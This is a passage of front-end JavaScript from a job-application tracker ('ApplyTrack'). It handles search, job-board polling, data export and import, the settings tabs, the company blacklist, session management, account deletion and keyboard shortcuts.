  state.searchPage = 0;
  state.searchWhere = "";
  state.searchLane = "";
  renderSidebar();
  // The results table follows the box when it is on screen, or on a wide screen where the
  // list and the table sit side by side; on a phone Enter opens it (#326).
  if (state.mode === "search") { if (searching()) renderSearchView(); else renderEmpty(); }
  else if (searching() && !window.matchMedia("(max-width: 767px)").matches) openSearchView({ focus: false });
});
searchEl.addEventListener("keydown", (e) => {
  if (e.key === "Enter" && searching()) { e.preventDefault(); openSearchView(); }
});
// A #app=<name> link — a search result, a notification, one pasted in — opens that
// application in the page already open, not only on load.
window.addEventListener("hashchange", () => {
  let target = "";
  try { target = new URLSearchParams(location.hash.slice(1)).get("app") || ""; } catch (_) {}
  if (target && state.apps.some((a) => a.filename === target)) {
    openApp(target);
    history.replaceState(null, "", location.pathname + location.search);
  }
});
laneSel.addEventListener("change", () => { state.filterLane = laneSel.value; renderSidebar(); });
statusSel.addEventListener("change", () => {
  state.filterStatus = statusSel.value;
  renderPipeline();
  renderSidebar();
});
sortSel.value = state.sort;
sortSel.addEventListener("change", () => {
  state.sort = SORT_KEYS.includes(sortSel.value) ? sortSel.value : "pipeline";
  try {
    localStorage.setItem(SORT_STORAGE_KEY, state.sort);
  } catch (_) {
    // Private mode / storage disabled: the choice just doesn't survive a reload.
  }
  renderSidebar();
  // The list reorders without changing its length, so the count's live region says
  // nothing — announce the new order instead.
  announce(`Sorted by ${sortSel.selectedOptions[0].textContent.trim()}.`);
});
$("#new-btn").addEventListener("click", openNew);

// On-demand discovery: fetch fresh leads now instead of waiting for a poll. The
// server hits job boards + link-checks each candidate, so this can take tens of
// seconds — disable the button and show progress meanwhile.
async function runPoll() {
  const btn = $("#poll-btn");
  if (btn.disabled) return;
  const label = btn.textContent;
  btn.disabled = true;
  btn.textContent = "Polling…";
  try {
    const r = await api("POST", "/api/poll");
    await refresh();
    const n = r.count || 0;
    if (n > 0) {
      // Surface what we just found: filter to leads so they're front and center.
      state.filterStatus = "lead";
      statusSel.value = "lead";
      renderPipeline();
      renderSidebar();
    }
    toast(n > 0 ? `Found ${n} new lead${n === 1 ? "" : "s"}.` : "No new leads.");
  } catch (e) {
    toast(e.message);
  } finally {
    btn.disabled = false;
    btn.textContent = label;
  }
}
$("#poll-btn").addEventListener("click", runPoll);

// ---- Data export / import (account portability) ---------------------------

// Download one of the two export flavours as a JSON file: the full private snapshot
// (Export) or the anonymized shareable opportunity list (Share). Uses fetch directly
// (not api(), which parses JSON) so we can stream the file straight to a download.
async function downloadExport(btn, url, fallbackName, doneMsg) {
  if (btn.disabled) return;
  const label = btn.textContent;
  btn.disabled = true;
  btn.textContent = "Exporting…";
  try {
    const res = await fetch(url);
    if (!res.ok) {
      if (res.status === 401) showLogin();
      throw new Error("Export failed.");
    }
    const blob = await res.blob();
    const cd = res.headers.get("Content-Disposition") || "";
    const m = /filename="?([^"]+)"?/.exec(cd);
    const filename = m ? m[1] : fallbackName;
    const url2 = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url2;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url2);
    toast(doneMsg);
  } catch (e) {
    toast(e.message);
  } finally {
    btn.disabled = false;
    btn.textContent = label;
  }
}

// Import an exported file (triggered from Settings · Account). A migration snapshot
// overwrites apps that share a slug; a shared opportunity list (format
// "applytrack-shared") adds new leads and skips slugs already tracked. Parse
// client-side first so a bad file fails fast without hitting the server.
$("#import-file").addEventListener("change", async (e) => {
  const file = e.target.files && e.target.files[0];
  e.target.value = ""; // let the same file be re-picked later
  if (!file) return;
  let doc;
  try {
    doc = JSON.parse(await file.text());
  } catch (_) {
    return toast("That file isn't a valid JSON export.");
  }
  const shared = !!doc && doc.format === "applytrack-shared";
  const prompt = shared
    ? "Import this shared list as new leads? Opportunities you already track are left untouched."
    : "Import overwrites applications that share a name with ones in this file. Continue?";
  if (!await confirmAction({
    title: shared ? "Import shared opportunities?" : "Import account data?",
    message: prompt,
    confirmLabel: "Import",
  })) return;
  try {
    const r = await api("POST", "/api/account/import", doc);
    await refresh();
    renderEmpty();
    const n = r.imported_applications || 0;
    if (shared) {
      const s = r.skipped_applications || 0;
      toast(`Added ${n} new lead${n === 1 ? "" : "s"}.`
        + (s ? ` Skipped ${s} you already track.` : ""));
    } else {
      toast(`Imported ${n} application${n === 1 ? "" : "s"}.`);
    }
  } catch (err) {
    toast(err.message);
  }
});

// ---- Settings hub -----------------------------------------------------------
// Every per-tenant setting in one place: discovery criteria, the résumé, the AI
// endpoint (+ cover-letter toggle), the company blacklist, and account-level data
// portability (export / share / import / delete) plus sign-out. Each tab talks to
// the tenant-scoped /api routes, so one user's settings never touch another's.

const SETTINGS_TABS = [
  ["accessibility", "Accessibility"],
  ["criteria", "Criteria"],
  ["resume", "Résumé"],
  ["ai", "AI"],
  ["agent", "Agent"],
  ["answers", "Answers"],
  ["notifications", "Notifications"],
  ["blacklist", "Blacklist"],
  ["account", "Account"],
];

// Bumped on every openSettings call. The fetch-then-render tab loaders bind Save via
// document-level selectors, so a load that resolves AFTER the user switched tabs would
// render into the wrong (detached) body and cross-wire the visible tab's Save button.
// Each loader re-reads this after its fetch and bails if it's been superseded.
let settingsGen = 0;

async function openSettings(tab, focusSelectedTab = false) {
  if (SETTINGS_TABS.some(([k]) => k === tab)) state.settingsTab = tab;
  const gen = ++settingsGen;
  state.mode = "settings";
  syncPipelineButton();
  state.current = null;
  showDetailPane();
  renderSidebar();
  contentEl.innerHTML = `
    <div class="settings-shell">
      <header class="settings-header">
        <div class="sheet-eyebrow">Workspace preferences</div>
        <h1>Settings</h1>
        <p>Shape discovery, drafting, account data, and how ApplyTrack feels to use.</p>
      </header>
      <div class="settings-layout">
        <nav class="settings-tabs" role="tablist" aria-label="Settings sections">
          ${SETTINGS_TABS.map(([k, label]) =>
            `<button class="btn ${k === state.settingsTab ? "btn-primary" : "btn-ghost"}"
               role="tab" aria-selected="${k === state.settingsTab}" data-tab="${k}" type="button">${label}</button>`).join("")}
        </nav>
        <div id="settings-body" role="tabpanel" aria-live="polite"></div>
      </div>
    </div>`;
  contentEl.querySelectorAll("[data-tab]").forEach((b) => {
    b.onclick = () => openSettings(b.dataset.tab);
  });
  const tabs = [...contentEl.querySelectorAll('[role="tab"]')];
  tabs.forEach((tabButton, index) => tabButton.addEventListener("keydown", (event) => {
    if (!["ArrowLeft", "ArrowRight", "Home", "End"].includes(event.key)) return;
    event.preventDefault();
    let next = index;
    if (event.key === "ArrowLeft") next = (index - 1 + tabs.length) % tabs.length;
    if (event.key === "ArrowRight") next = (index + 1) % tabs.length;
    if (event.key === "Home") next = 0;
    if (event.key === "End") next = tabs.length - 1;
    openSettings(tabs[next].dataset.tab, true);
  }));
  const body = $("#settings-body");
  try {
    if (state.settingsTab === "accessibility") renderAccessibilityPreferences(body, announce);
    else if (state.settingsTab === "criteria") await loadCriteriaTab(body, gen);
    else if (state.settingsTab === "resume") await loadResumeTab(body, gen);
    else if (state.settingsTab === "ai") await loadLlmTab(body, gen);
    else if (state.settingsTab === "agent") await loadAgentTab(body, gen);
    else if (state.settingsTab === "answers") await loadAnswersTab(body, gen);
    else if (state.settingsTab === "notifications") await loadNotificationsTab(body, gen);
    else if (state.settingsTab === "blacklist") await loadBlacklistTab(body);
    else await loadAccountTab(body);
  } catch (e) {
    toast(e.message);
  }
  document.title = `${SETTINGS_TABS.find(([k]) => k === state.settingsTab)?.[1] || "Settings"} | ApplyTrack`;
  if (focusSelectedTab) {
    requestAnimationFrame(() => contentEl.querySelector('[role="tab"][aria-selected="true"]')?.focus());
  } else {
    focusView("#settings-body h2");
  }
}

// True once a newer openSettings has started — a stale loader must not touch the DOM.
function settingsSuperseded(gen) {
  return gen !== settingsGen;
}
$("#settings-btn").addEventListener("click", () => openSettings());

// Phone bottom bar — reuse the existing controls. ☰ is the detail→list "back"
// (just hides the detail pane; the selected app stays rendered underneath).
$("#m-new").addEventListener("click", openNew);
$("#m-poll").addEventListener("click", runPoll);
$("#m-settings").addEventListener("click", () => openSettings());
$("#m-list").addEventListener("click", () => showListPane());

// Settings · Blacklist tab — the first place blacklisted companies can be seen and
// un-blacklisted (adding happens here or via "Blacklist company" on an app).
async function loadBlacklistTab(body) {
  const companies = await api("GET", "/api/blacklist");
  body.innerHTML = `
    <article class="sheet">
      <div class="sheet-eyebrow">Blacklist</div>
      <h2 class="sheet-title">Companies the poller skips</h2>
      <p class="field-help">
        Leads from these companies are never staged. Names are stored normalized
        (lowercased, punctuation-insensitive).
      </p>
      <div id="bl-list" class="board-list mt-5">
        ${companies.length
          ? companies.map((c) =>
              `<div class="board-row">
                <span class="board-slug mono">${escapeHtml(c)}</span>
                <button class="btn btn-ghost btn-xs" data-bl-remove="${escapeHtml(c)}" type="button"
                  aria-label="Remove ${escapeHtml(c)} from blacklist">Remove</button>
              </div>`).join("")
          : `<div class="board-empty field-help">No blacklisted companies.</div>`}
      </div>
      <div class="board-add mt-3">
        <label class="sr-only" for="bl-company">Company name</label>
        <input id="bl-company" class="field-input mono" placeholder="company name (e.g. Evil Corp)" />
        <button class="btn btn-ghost" data-act="bl-add" type="button">+ Blacklist company</button>
      </div>
    </article>`;
  body.querySelectorAll("[data-bl-remove]").forEach((btn) => {
    btn.onclick = async () => {
      try {
        await api("DELETE", `/api/blacklist/${encodeURIComponent(btn.dataset.blRemove)}`);
        toast(`Removed "${btn.dataset.blRemove}" from the blacklist.`);
        await loadBlacklistTab(body);
      } catch (e) {
        toast(e.message);
      }
    };
  });
  body.querySelector('[data-act="bl-add"]').onclick = async () => {
    const company = $("#bl-company").value.trim();
    if (!company) return toast("Enter a company to blacklist.");
    try {
      await api("POST", "/api/blacklist", { company });
      toast(`Blacklisted "${company}".`);
      await loadBlacklistTab(body);
    } catch (e) {
      toast(e.message);
    }
  };
}

// Settings · Account tab — data portability (the OSS no-lock-in promise) and the
// account-level actions: sign out, and the cascade delete of everything.
async function loadAccountTab(body) {
  body.innerHTML = `
    <article class="sheet">
      <div class="sheet-eyebrow">Account</div>
      <h2 class="sheet-title">Your data, portable</h2>

      <div class="mt-5">
        <div class="field-label">Export — private migration snapshot</div>
        <p class="field-help">
          Everything: applications, criteria, blacklist. Import it on another instance to move home.
        </p>
        <div class="mt-3 flex flex-wrap items-center gap-2">
          <button class="btn btn-ghost" data-act="export" type="button">⤓ Export my data</button>
          <button class="btn btn-ghost" data-act="import" type="button">⤒ Import a file</button>
        </div>
      </div>

      <div class="mt-5 border-t border-rule pt-4">
        <div class="field-label">Share — anonymized opportunity list</div>
        <p class="field-help">
          Company, role, link, location, source only — no status, notes, contacts, dates, or score.
          A peer imports it and every entry lands as a fresh lead.
        </p>
        <div class="mt-3">
          <button class="btn btn-ghost" data-act="share" type="button">⤴ Share an opportunity list</button>
        </div>
      </div>

      <div class="mt-5 border-t border-rule pt-4">
        <div class="field-label" id="sessions-heading">Where you're signed in</div>
        <p class="field-help">
          Sessions end after 30 days unused, and 90 days after sign-in at the latest. Signing out everywhere else ends every session but this one.
        </p>
        <ul id="account-sessions" class="agent-log" aria-labelledby="sessions-heading" aria-live="polite">
          <li class="mt-2 text-sm text-ink-faint">Loading…</li>
        </ul>
        <div class="mt-3 flex flex-wrap items-center gap-2">
          <button class="btn btn-ghost" data-act="logout" type="button">Sign out</button>
          <button class="btn btn-ghost" data-act="logout-others" type="button">Sign out everywhere else</button>
        </div>
      </div>

      <div class="mt-5 border-t border-rule pt-4">
        <div class="field-label">Danger zone</div>
        <p class="field-help">
          Deletes your account and every application, setting, and session with it. Immediate and unrecoverable.
        </p>
        <div class="mt-3">
          <button class="btn btn-danger" data-act="delete-account" type="button">DELETE MY DATA</button>
        </div>
      </div>
    </article>`;

  const act = (name) => body.querySelector(`[data-act="${name}"]`);
  act("export").onclick = () =>
    downloadExport(act("export"), "/api/account/export",
      "applytrack-export.json", "Exported your data.");
  act("share").onclick = () =>
    downloadExport(act("share"), "/api/account/export/shared",
      "applytrack-shared.json", "Exported a shareable list — personal state stripped.");
  act("import").onclick = () => $("#import-file").click();
  act("logout").onclick = async () => {
    try {
      await api("POST", "/api/auth/logout");
    } catch (_) {}
    location.reload();
  };
  const sessionList = body.querySelector("#account-sessions");
  const loadSessions = async () => {
    try {
      const sessions = await api("GET", "/api/account/sessions");
      sessionList.innerHTML = sessions.map((x) => `
        <li class="mt-2 text-sm">
          <span>${escapeHtml(x.user_agent || "Unknown browser")}</span>
          ${x.current ? `<strong>(this browser)</strong>` : ""}
          <div class="field-help">Last used ${escapeHtml(new Date(x.last_seen_at).toLocaleString())}
            · signed in ${escapeHtml(new Date(x.created_at).toLocaleString())}</div>
        </li>`).join("") || `<li class="mt-2 text-sm">No active sessions.</li>`;
    } catch (e) {
      sessionList.innerHTML = `<li class="mt-2 text-sm">${escapeHtml(e.message)}</li>`;
    }
  };
  loadSessions();
  act("logout-others").onclick = async () => {
    try {
      const r = await api("DELETE", "/api/account/sessions");
      toast(r.revoked === 1 ? "Signed out 1 other session." : `Signed out ${r.revoked} other sessions.`);
      await loadSessions();
    } catch (e) {
      toast(e.message);
    }
  };
  act("delete-account").onclick = async () => {
    // A yes/no confirm is too easy to click through for something unrecoverable, so this
    // one asks them to type the words. The button stays inert until the text matches.
    if (!await confirmByTyping({
      title: "Delete all your data?",
      message: "Every application, setting, cover letter, and session will be deleted immediately, "
        + "and you will be signed out. This cannot be undone. Export first if you want a copy.",
      phrase: "I agree",
      confirmLabel: "DELETE MY DATA",
    })) return;
    try {
      await api("DELETE", "/api/account");
      location.reload();
    } catch (e) {
      toast(e.message);
    }
  };
}

// ---- Live refresh (the hourly poller writes new files) --------------------

const POLL_MS = 5000;
async function pollApps() {
  if (state.mode === "edit" || state.mode === "new" || state.mode === "raw") return;
  if (document.hidden) return;
  try {
    await refresh();
  } catch (_) {}
}
setInterval(pollApps, POLL_MS);
document.addEventListener("visibilitychange", () => { if (!document.hidden) pollApps(); });

// ---- Keyboard shortcuts ---------------------------------------------------

function isTyping(el) {
  return el && (el.tagName === "INPUT" || el.tagName === "TEXTAREA" ||
    el.tagName === "SELECT" || el.isContentEditable);
}
async function navigateList(delta) {
  const apps = filteredApps();
  if (!apps.length) return;
  let idx = apps.findIndex((a) => a.filename === state.current);
  if (idx === -1) idx = delta > 0 ? -1 : 0;
  idx = Math.max(0, Math.min(apps.length - 1, idx + delta));
  await openApp(apps[idx].filename);
  const active = listEl.querySelector('.application-card[aria-current="true"]');
  if (active) active.scrollIntoView({ block: "nearest" });
}
document.addEventListener("keydown", (e) => {
  if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === "s") {
    const saveBtn = contentEl.querySelector('[data-act="save"]');
    if (saveBtn) { e.preventDefault(); saveBtn.click(); }
    return;
  }
  if (e.key === "Escape") {
    if (document.activeElement === searchEl) return searchEl.blur();
    const cancelBtn = contentEl.querySelector('[data-act="cancel"]');
    if (cancelBtn) cancelBtn.click();
    return;
  }
  if (isTyping(document.activeElement) || e.metaKey || e.ctrlKey || e.altKey) return;
  if (e.key === "/") { e.preventDefault(); searchEl.focus(); searchEl.select(); }
  else if (e.key === "n") { e.preventDefault(); openNew(); }
  else if (e.key === "j") { e.preventDefault(); navigateList(1); }
  else if (e.key === "k") { e.preventDefault(); navigateList(-1); }
});

applyPreferences(readPreferences(), false);

const mobileQuery = window.matchMedia("(max-width: 767px)");
mobileQuery.addEventListener("change", (event) => {
  const list = $("#application-list");
  if (!event.matches || !document.body.classList.contains("m-detail")) list.removeAttribute("aria-hidden");
  else list.setAttribute("aria-hidden", "true");
});

// Paint the running build into the header. /health is unauthenticated, so this also
// works on the sign-in screen. The path is RELATIVE on purpose: the app is served under
// a path prefix in some deployments (/OSApplyTrack/), where an absolute "/health" would
// miss the proxy. Any failure leaves the element hidden rather than showing a wrong or
// empty version, so a version on screen is always a version the server confirmed.
async function showVersion() {
  const el = $("#app-version");
  if (!el) return;
  try {
    const res = await fetch("health", { headers: { Accept: "application/json" } });
    if (!res.ok) return;
    const version = (await res.json()).version;
    if (!version || typeof version !== "string") return;
    el.textContent = `v${version}`;
    el.hidden = false;
  } catch (_) {
    /* offline or blocked: leave the badge hidden */
  }
}

// The public-beta terms. Shown once per signed-in session, before anything else renders.
//
// sessionStorage, not localStorage, is the point: it dies with the tab, so the terms come
// back every time someone logs on rather than being acknowledged once and forgotten. If
// storage throws (private mode, blocked site data) the dialog simply shows again, which is
// the safe direction to fail.
const BETA_ACK_KEY = "applytrack.beta-ack";

function betaTermsAcknowledged() {
  try {
    return sessionStorage.getItem(BETA_ACK_KEY) === "1";
  } catch (_) {
    return false;
  }
}

async function showBetaTerms() {
  const dialog = $("#beta-dialog");
  if (!dialog || betaTermsAcknowledged()) return;
  // No cancel path and Escape is refused: acknowledging is the only way through, because
  // the whole purpose is that nobody reaches the app without having seen this.
  dialog.addEventListener("cancel", (e) => e.preventDefault());
  dialog.showModal();
  $("#beta-accept")?.focus();
  await new Promise((resolve) => {
    $("#beta-accept").onclick = () => {
      try {
        sessionStorage.setItem(BETA_ACK_KEY, "1");
      } catch (_) {
        /* storage blocked: they will simply see this again */
      }
      dialog.close();
      resolve();
    };
  });
}

(async function boot() {
  showVersion();
  try {
    // Gate the app on a live session; a 401 here pops the login view (via api())
    // and we stop booting until the user signs in and reloads.
    await api("GET", "/api/auth/me");
  } catch (e) {
    if (e.status === 401) return;
  }
  // Signed in, so the beta terms come before any of their data is fetched or drawn.
  await showBetaTerms();
  // Whether this tenant wants cover letters decides if the app sheet renders any
  // drafting UI at all; default ON when the lookup fails so nothing is hidden by error.
  // Same for the agent, which defaults OFF: nothing agent-shaped renders unless the
  // tenant switched it on. Fetched together so the list is not held up by either.
  const [llm, agent] = await Promise.allSettled([
    api("GET", "/api/llm-settings"),
    api("GET", "/api/agent-settings"),
  ]);
  if (llm.status === "fulfilled") state.coverLettersEnabled = llm.value.cover_letters_enabled !== false;
  if (agent.status === "fulfilled") {
    state.agentEnabled = agent.value.enabled === true;
    state.browserAvailable = agent.value.browser_available === true;
    state.longTail = agent.value.long_tail === true;
    state.linkedinEasy = agent.value.linkedin_easy === true;
  }
  try {
    await refresh();
    // A notification's deep link (/#app=<name>) opens that application on load; the
    // hash keeps the slug out of server logs. Cleared once consumed.
    let target = "";
    try {
      target = new URLSearchParams(location.hash.slice(1)).get("app") || sessionStorage.getItem("returnTo") || "";
      sessionStorage.removeItem("returnTo");
    } catch (_) {}
    if (target && state.apps.some((a) => a.filename === target)) {
      await openApp(target);
      history.replaceState(null, "", location.pathname + location.search);
    } else {
      renderEmpty();
    }
  } catch (e) {
    contentEl.innerHTML = `<div class="empty"><div class="empty-title">Couldn't load applications.</div>
      <p class="font-mono text-xs">${escapeHtml(e.message)}</p></div>`;
  }
})();
